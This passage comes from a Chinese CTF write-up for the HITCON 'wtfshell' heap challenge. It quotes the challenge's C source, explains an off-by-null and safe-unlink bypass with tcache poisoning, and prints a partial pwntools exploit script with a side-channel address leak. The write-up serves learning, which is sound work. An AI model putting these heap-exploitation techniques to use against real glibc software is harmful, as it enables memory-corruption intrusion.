*/</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be writable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; WRPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;wtf: Â¬ perm\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(fdata) &gt; <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata)) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(fdata) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcpy</span>(gfiles[i]-&gt;fdata, fdata);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(fdata);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    write_str(<span class="string">&quot;wtf: \&quot;&quot;</span>);</span><br><span class="line">    write_str(fname);</span><br><span class="line">    write_str(<span class="string">&quot;\&quot; âˆ‰ â„±\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­å…³é”®çš„å³ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(fdata) &gt; <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata)) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(fdata) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcpy</span>(gfiles[i]-&gt;fdata, fdata);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(fdata);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è‹¥ <code>strlen(fdata)&lt;strlen(gfiles[i]-&gt;fdata)</code> ï¼Œæ˜¯ä¸ä¼šè§¦å‘ <code>realloc</code>  çš„ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨ <code>strcpy</code> ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æå‰å¡«æ»¡ä¸€ä¸ªå †å—ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ª fdata size æ›´å°çš„æ—¶å€™ï¼Œä»åå¾€å‰å¡«å…… \x00 å­—èŠ‚ï¼Œè¿™æ ·å°±èƒ½å¤Ÿä¼ªé€ å¥½æˆ‘ä»¬çš„ <code>fake_next_size</code> ã€‚</p>
<p>åç»­å†™å…¥åœ°å€ä¹Ÿå¤šæ¬¡ç”¨åˆ°è¿™ä¸ªæ–¹å¼ï¼Œå› æ­¤æˆ‘å°è£…äº†ä¸€ä¸ªå‡½æ•° (ä¸å¤ªä¼˜é›…ï¼Œå°†å°±ç€çœ‹)ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">write_addr</span><span class="params">(filename,payload,size)</span>:</span></span><br><span class="line"><span class="function">    whole_size </span>= len(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(size):</span><br><span class="line">        <span class="meta"># log.success(hex(i))</span></span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i<span class="number">-2</span>:whole_size-i<span class="number">-1</span>] == b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>:</span><br><span class="line">            <span class="meta"># pause()</span></span><br><span class="line">            recover_data(filename,no_null_payload[<span class="number">0</span>:whole_size-i<span class="number">-2</span>])</span><br><span class="line">            <span class="meta"># debug(<span class="meta-string">&quot;free&quot;</span>)</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h4 id="å®æ“off-by-null"><a class="markdownIt-Anchor" href="#å®æ“off-by-null">#</a> å®æ“ off by null</h4>
<p>æ•´ç†ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰åšåˆ°çš„äº‹æƒ…ï¼š</p>
<ul>
<li>åˆ†é…äº†ä¸€ä¸ªè¢«å¡«æ»¡çš„ gbuffï¼Œèƒ½å¤Ÿ off by nullã€‚</li>
<li>å¯ä»¥åˆ©ç”¨ <code>remove_slash</code>  å’Œ <code>strtok</code>  é…åˆï¼Œæ„é€ å¥½ <code>off-by-null-chunk</code>  çš„ <code>prev_size</code> ã€‚ï¼ˆå‰ææ˜¯è¯¥ chunk size å¾—å°äº 0x400ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æå‰å¡«æ»¡å¯¹åº” size çš„ <code>tcache_list</code> ï¼‰</li>
<li>å¯ä»¥ç”¨æˆ‘çš„ <code>write_addr</code>  å‡½æ•°ä¼ªé€  <code>off-by-null-chunk</code>  çš„ <code>fake_size</code> ã€‚</li>
</ul>
<p>å¹¶ä¸”è¿™é“é¢˜æˆ‘ä»¬å·²ç»ç”¨ä¾§ä¿¡é“æ³„éœ²äº†å †åœ°å€ï¼Œå¤§å¤§é™ä½äº† <code>off-by-null</code>  çš„éš¾åº¦ï¼Œå¯ä»¥è¿›è¡Œ <code>safe-unlink</code> ã€‚</p>
<p>åªç”¨åœ¨ä¸Šæ–¹ä¼ªé€ ä¸€ä¸ª sizeï¼Œç„¶åç»•è¿‡å¦‚ä¸‹æ£€æµ‹å³å¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>å †é£æ°´ï¼š</p>
<p>å¦‚æœæˆ‘ä»¬æ„é€ æˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0  fake_size</span><br><span class="line">fake_fd fake_bk</span><br><span class="line">fake_fd_nextsize fake_bk_nextsize</span><br><span class="line">P-&gt;addr</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ³¨æ„çš„æ˜¯ï¼Œ <code>p-&gt;fd-&gt;bk</code>  å’Œ <code>p-&gt;bk-&gt;fd</code>  æŒ‡å‘çš„åœ°æ–¹ï¼Œä¸èƒ½å’Œ <code>p-&gt;fd_nextsize-&gt;bk_nextsize</code>  å’Œ <code>p-&gt;bk_nextsize-&gt;fd_nextsize</code>  æŒ‡å‘çš„åœ°æ–¹ç›¸åŒï¼Œå¦åˆ™åœ¨é€šè¿‡ç¬¬ä¸€ä¸ªæ£€æµ‹ä¹‹åï¼Œä¼šæ‰§è¡Œï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure>
<p>å°±ç»•ä¸è¿‡ç¬¬äºŒä¸ªæ£€æµ‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>å› æ­¤æœ€ç»ˆæ„é€ ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0  fake_size</span><br><span class="line">fake_fd fake_bk</span><br><span class="line">fake_fd_nextsize fake_bk_nextsize</span><br><span class="line">P-&gt;addr P-&gt;addr</span><br></pre></td></tr></table></figure>
<p><img data-src="https://tvax2.sinaimg.cn/large/008qDYGVgy1h8o78mulzqj30ib0av49z.jpg" alt="1"></p>
<p>è¿™é‡Œæˆ‘åœ¨ <code>off-by-null-chunk</code>  ä¸‹æ–¹æ²¡æœ‰æ„é€ å¥½ï¼Œå¯¼è‡´ä¸€ä¸ª <code>tcache</code>  çš„ <code>prev_inuse</code>  ä¸º 0ï¼Œè§¦å‘äº†ç¬¬äºŒæ¬¡ <code>unlink</code> ï¼Œå°è°ƒæ•´äº†ä¸€ä¸‹å³å¯ã€‚</p>
<p><code>off-by-null</code>  ä¹‹åï¼Œä¸­é—´å¤¹äº†å‡ ä¸ª <code>tcache</code> ï¼Œå³å¯å®ç°æ³„éœ²å’Œä»»æ„åœ°å€å†™ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<p>èƒ½å¤Ÿä»»æ„å†™çš„ <code>tcache</code>  size å¿…é¡»è¦å°ï¼Œå› ä¸º <code>cmd</code>  ä¸­ä»»ä½•ç”³è¯·å‡½æ•°éƒ½æ˜¯ä»¥ <code>strlen</code>  è¿”å›ç»“æœæ¥è¿›è¡Œ malloc çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æƒ³ç”³è¯·ä»»æ„å†™ï¼Œæˆ‘ä»¬å°±å¿…é¡»å¡«æ»¡å…¶ chunkã€‚ä¾‹å¦‚æˆ‘æœ€å¼€å§‹æ„é€ çš„ <code>tcache</code>  size ä¸º 0x300ï¼Œè¿™æ ·çš„è¯ï¼Œç”³è¯·è¿‡å»çš„å †å—å¿…é¡»å¡«æ»¡ 0x2f0 å†…å®¹ã€‚</p>
<p><code>wtfshell1</code>  ä¸­ï¼Œæˆ‘çš„æ€è·¯æ˜¯ç”³è¯·åˆ° <code>flag1</code>  å †å—ï¼Œæ›´æ”¹å…¶ <code>file-&gt;flag</code>  ä¸º 3 (rw) ä¸ <code>file-&gt;name</code> ã€‚</p>
<p>å¦‚æœä»»æ„å†™çš„ <code>tcache_size</code>  è¿‡å¤§ï¼Œç”³è¯·è¿‡å»å¿…é¡»å¾—å†™å®Œï¼Œè¿™ä¼šå¯¼è‡´æŠŠå †ä¸Šå¾ˆå¤šæŒ‡é’ˆæˆ–è€… <code>file-&gt;name</code>  ç ´åæ‰ã€‚</p>
<p><code>wtfshell2</code>  ä¸­ï¼Œæˆ‘çš„æ€è·¯æ˜¯æ‰“ libc got è¡¨ï¼Œé‚£ 0x2f0 å¤§å°å¿…å®šä¼šç ´åæ‰éå¸¸å¤šä¸œè¥¿ï¼Œå› æ­¤ä¹Ÿæ˜¯ä¸å¯èƒ½çš„ã€‚</p>
<p>å› æ­¤åšåˆ°è¿™ä¹‹åï¼Œæˆ‘åˆé‡æ–°è°ƒæ•´ <code>tcache_size</code> ï¼Œå°æ”¹äº†ä¸€æ³¢å †é£æ°´ã€‚</p>
<h3 id="å¤¹å¿ƒé¥¼æ”»å‡»"><a class="markdownIt-Anchor" href="#å¤¹å¿ƒé¥¼æ”»å‡»">#</a> å¤¹å¿ƒé¥¼æ”»å‡»</h3>
<p>è‡³æ­¤æˆ‘ä»¬å·²ç»æ‹¿åˆ° <code>heap_base</code> ï¼Œ <code>libc_base</code> ï¼Œå¹¶ä¸”æœ‰äº†ä»»æ„å†™ï¼Œæ³„éœ²ä¹‹åç”³è¯·ä»»æ„å†™è¿‡å»æ”¹æ‰ <code>file-&gt;flag</code>  ä¸º 3 (rw) ä¸ <code>file-&gt;name</code> ã€‚</p>
<p>è§‚å¯Ÿ <code>cmd_omfg</code> : å‘ç°å¦‚æœæ˜¯ root ç”¨æˆ·ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶å†…å®¹ (è‹¥å…·æœ‰å¯è¯»å±æ€§)ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_omfg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);</span><br><span class="line">    <span class="keyword">if</span> (!fname) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;omfg: file âˆˆ âˆ…\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    remove_slash(fname);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(fname) == <span class="number">0</span>) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;omfg: file = âˆ…\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be readable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; RDPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;omfg: Â¬ perm\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!gfiles[i]-&gt;fdata) &#123; <span class="comment">// empty file</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            write_str(gfiles[i]-&gt;fdata);</span><br><span class="line">            write_str(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    write_str(<span class="string">&quot;omfg: \&quot;&quot;</span>);</span><br><span class="line">    write_str(fname);</span><br><span class="line">    write_str(<span class="string">&quot;\&quot; âˆ‰ â„± \n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äºæˆ‘å·²ç»å°† <code>file-&gt;flag</code>  æ”¹ä¸º 3ï¼Œ <code>file-&gt;name</code>  æ”¹ä¸º <code>aaaaaaaaaaaaaaaa</code> ã€‚</p>
<p>ç›´æ¥è°ƒç”¨ show å³å¯æ‰“å°å‡ºç¬¬ä¸€ä¸ª flagã€‚</p>
<p><img data-src="https://tvax1.sinaimg.cn/large/008qDYGVgy1h8o84bruryj30lf02qdhj.jpg" alt="2"></p>
<p>è‡³æ­¤ï¼Œ <code>wtfshell1</code>  getã€‚</p>
<h3 id="wtfshell1-exp"><a class="markdownIt-Anchor" href="#wtfshell1-exp">#</a> wtfshell1-exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qwq</span>(<span class="params">name</span>):</span></span><br><span class="line">  log.success(<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">point</span>):</span></span><br><span class="line">    <span class="keyword">if</span> point == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r,<span class="string">&quot;b &quot;</span>+point)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;âˆš&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;rip.&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_file</span>(<span class="params">name,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;nsfw,&#x27;</span>+name+<span class="string">b&#x27;,&#x27;</span>+flag</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;omfg,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;wtf,&#x27;</span>+content+<span class="string">b&#x27;,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;gtfo,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;stfu,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_pwd</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_all</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;irl.&#x27;</span></span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        log.success(<span class="string">&quot;addr: &quot;</span>+<span class="built_in">hex</span>(u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>,<span class="number">0xff</span>):</span><br><span class="line">            payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">            menu(payload)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            r.send(pwd)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">            r.send(pwd+addr+<span class="built_in">chr</span>(j)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            data=r.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                addr+=<span class="built_in">chr</span>(j)</span><br><span class="line">                r.send(<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">filename,payload,size</span>):</span></span><br><span class="line">    whole_size = <span class="built_in">len</span>(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="comment"># log.success(hex(i))</span></span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i-<span class="number">2</span>:whole_size-i-<span class="number">1</span>] == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            